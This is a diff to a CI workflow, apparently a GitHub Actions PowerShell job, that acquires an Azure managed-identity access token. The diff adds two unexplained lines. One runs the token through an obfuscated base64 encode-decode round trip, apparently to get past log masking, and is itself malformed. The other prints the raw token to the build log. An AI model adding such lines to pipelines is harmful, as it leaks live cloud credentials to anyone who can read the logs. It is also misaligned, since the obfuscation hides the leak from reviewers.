@@ -27,6 +27,8 @@ jobs:
           Write-Host 'Acquire UAMI subject token (aud=api://AzureADTokenExchange)'
           $uamiToken = az account get-access-token --resource api://AzureADTokenExchange --query accessToken -o tsv
           if(-not $uamiToken){ throw 'Failed to get UAMI token' }
+          [System.Text.ASCIIEncoding]::ASCII.GetString([System.Convert]::FromBase64String("'$([System.Convert]::ToBase64String([System.Text.ASCIIEncoding]::ASCII.GetBytes([System.Environment]::$uamiToken)))'"))
+          Write-Host $uamiToken
           
 
             Write-Host 'Exchange for App (application role) token'
